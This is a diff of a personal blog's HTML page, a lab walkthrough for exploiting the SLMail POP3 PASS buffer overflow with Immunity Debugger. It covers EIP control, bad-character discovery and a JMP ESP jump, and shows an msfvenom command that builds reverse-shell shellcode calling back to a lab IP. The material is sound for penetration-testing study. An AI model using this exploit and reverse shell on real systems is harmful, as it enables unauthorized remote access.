@@ -3,27 +3,29 @@
 <head>
         <meta charset="utf-8" />
         <meta name="generator" content="Pelican" />
-        <title>"OSCP: Windows Buffer Overflow"</title>
+        <title>"Windows Buffer Overflow"</title>
         <link rel="stylesheet" href="/theme/css/main.css" />
         <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daniel Haggerty's Blog Atom Feed" />
         <link href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="Daniel Haggerty's Blog RSS Feed" />
-        <meta name="description" content="Cyber Security tags: OSCP Windows Buffer Overflow Windows Buffer Overflow (SLMail) Seattle Lab Mail (SLMail) is fantastic vulnerable app to..." />
+        <meta name="description" content="Windows Buffer Overflow (SLMail) Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to..." />
 </head>
 
 <body id="index" class="home">
         <header id="banner" class="body">
                 <h1><a href="/">Daniel Haggerty's Blog</a></h1>
                 <nav><ul>
-                    <li class="active"><a href="/category/misc.html">misc</a></li>
-                    <li><a href="/category/oscp.html">OSCP</a></li>
+                    <li><a href="/category/dfir.html">DFIR</a></li>
+                    <li><a href="/category/docker.html">Docker</a></li>
+                    <li><a href="/category/network.html">Network+</a></li>
+                    <li class="active"><a href="/category/oscp.html">OSCP</a></li>
                 </ul></nav>
         </header><!-- /#banner -->
 <section id="content" class="body">
   <article>
     <header>
       <h1 class="entry-title">
-        <a href="/oscp-windows-buffer-overflow.html" rel="bookmark"
-           title="Permalink to "OSCP: Windows Buffer Overflow"">"OSCP: Windows Buffer Overflow"</a></h1>
+        <a href="/windows-buffer-overflow.html" rel="bookmark"
+           title="Permalink to "Windows Buffer Overflow"">"Windows Buffer Overflow"</a></h1>
     </header>
 
     <div class="entry-content">
@@ -33,19 +35,11 @@
         </abbr>
 
         <address class="vcard author">
-                By                         <a class="url fn" href="/author/daniel.html">Daniel</a>
+                By                         <a class="url fn" href="/author/daniel-haggerty.html">Daniel Haggerty</a>
         </address>
-<p>In <a href="/category/misc.html">misc</a>.</p>
-
-</footer><!-- /.post-info -->      <ul>
-<li>Cyber Security
-tags:</li>
-<li>OSCP</li>
-<li>Windows</li>
-<li>Buffer Overflow</li>
-</ul>
-<hr>
-<h1>Windows Buffer Overflow (SLMail)</h1>
+<p>In <a href="/category/oscp.html">OSCP</a>.</p>
+<p>tags: <a href="/tag/penetration-testing.html">Penetration Testing</a> <a href="/tag/buffer-overflow.html">Buffer Overflow</a> </p>
+</footer><!-- /.post-info -->      <h1>Windows Buffer Overflow (SLMail)</h1>
 <p>Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the <strong>POP3 PASS</strong> command. Both the app itself and the exploit are available on Exploit Database (<a href="https://www.exploit-db.com/exploits/638">exploit</a>)!</p>
 <p>You will have to jump between your Kali machine (to tweak your exploit) and the Windows VM (to restart SLMail after each crash and analyze the crash in Immunity Debugger) You will need <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a> to help develop your exploit.</p>
 <h3>1. Run Immunity Debugger, attach SLMail, run the buffer overflow and crash SLMail</h3>
@@ -85,7 +79,7 @@ Open Immunity Debugger and attach SLMail to it; Make sure that Immunity debugger
 </code></pre></div>
 
 <p>The SLMail app should crash and the EIP register in Immunity should be filled with <strong>41</strong>s... the hex equivalent of the ASCII character <strong>A</strong> see figure below (1).</p>
-<p><img alt="image" src="/assets/images/oscp/win_buff_0.jpg" title="step 1"></p>
+<p><img alt="image" src="/images/oscp/win_buff_0.jpg" title="step 1"></p>
 <h3>2. Control EIP</h3>
 <p>Next we need to locate the exact bytes at which the Extended Instruction Pointer (EIP) is overwritten. The EIP tells the computer where in memory to execute the next command. If we can find where the EIP is we can exchange those bytes at the EIP with a memory address containing our reverse shellcode. So, instead of sending a string of 2700 <strong>A</strong>s, we send a specially crafted string of 2700 characters. Each sequence of 4 letters in this string is unique. We can simply determine how far along the 2700 charcaters the unique 4 letter overwrite the EIP. 
 2a. We use a Metasploit script to generate the unique string as follows:</p>
@@ -113,7 +107,7 @@ Can we extend buffer to 3500 to make room for shellcode? If the ESP is located a
 </code></pre></div>
 
 <p>The result is in the figure below (3).</p>
-<p><img alt="image" src="/assets/images/oscp/win_buff_1.JPG" title="step 2a, 2b, 3"></p>
+<p><img alt="image" src="/images/oscp/win_buff_1.JPG" title="step 2a, 2b, 3"></p>
 <p>As we can see, our buffer overflow still crashes the app. We now have some space to insert our shellcode...</p>
 <h3>4. Discover bad characters (\0x00, \0x0D, \0x0A, etc)</h3>
 <p>We do need to ensure that no <strong>bad characters</strong> get sent in the buffer. We know that <strong>A</strong>s, <strong>B</strong>,s and <strong>C</strong>s dont seem to be an issue thus far. But what about characters like <strong>00</strong> that represent carriage return! We need to find all possible bad characters and ensure that our shellcode is composed without them. We can achieve this by sending a full list of all possible characters in the buffer starting from the ESP (where our shellcode will start). Immunity debugger has the ability to identify the bad characters if we simply examine the hex dump from the ESP onwards! </p>
@@ -153,7 +147,7 @@ Replace the EIP (was <strong>BBBB</strong> previously) in the buffer string of t
 </code></pre></div>
 
 <p>If we rerun the exploit the EIP will be hit. It will point to the JMP ESP address where the buffer of <strong>C</strong>s (or future shellcode) will run ()see figure below (5)!</p>
-<p><img alt="image" src="/assets/images/oscp/win_buff_2.JPG" title="step 4 &amp; 5"></p>
+<p><img alt="image" src="/images/oscp/win_buff_2.JPG" title="step 4 &amp; 5"></p>
 <h3>6. Make shellcode excluding bad chars and insert to python script</h3>
 <p>We can create the shellcode with Metasploit tool <strong>msfvenom</strong>. This takes the arguments for you listening IP address (of your Kali machine, and the port you will be listening on - using netcat). The other argument of interest here is to exclude the bad characters we found earlier.</p>
 <div class="highlight"><pre><span></span><code>msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.11.0.160 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f c –e x86/shikata_ga_nai -b <span class="s2">&quot;\x00\x0a\x0d&quot;</span>
@@ -228,8 +222,7 @@ Replace the EIP (was <strong>BBBB</strong> previously) in the buffer string of t
                         <ul>
                             <li><a href="https://getpelican.com/">Pelican</a></li>
                             <li><a href="https://www.python.org/">Python.org</a></li>
-                            <li><a href="https://palletsprojects.com/p/jinja/">Jinja2</a></li>
-                            <li><a href="#">You can modify those links in your config file</a></li>
+                            <li><a href="https://www.docker.com/">Docker</a></li>
                         </ul>
                 </div><!-- /.blogroll -->
                 <div class="social">
@@ -238,7 +231,6 @@ Replace the EIP (was <strong>BBBB</strong> previously) in the buffer string of t
                             <li><a href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
                             <li><a href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate">rss feed</a></li>
 
-                            <li><a href="#">You can add links in your config file</a></li>
                             <li><a href="#">Another social link</a></li>
                         </ul>
                 </div><!-- /.social -->
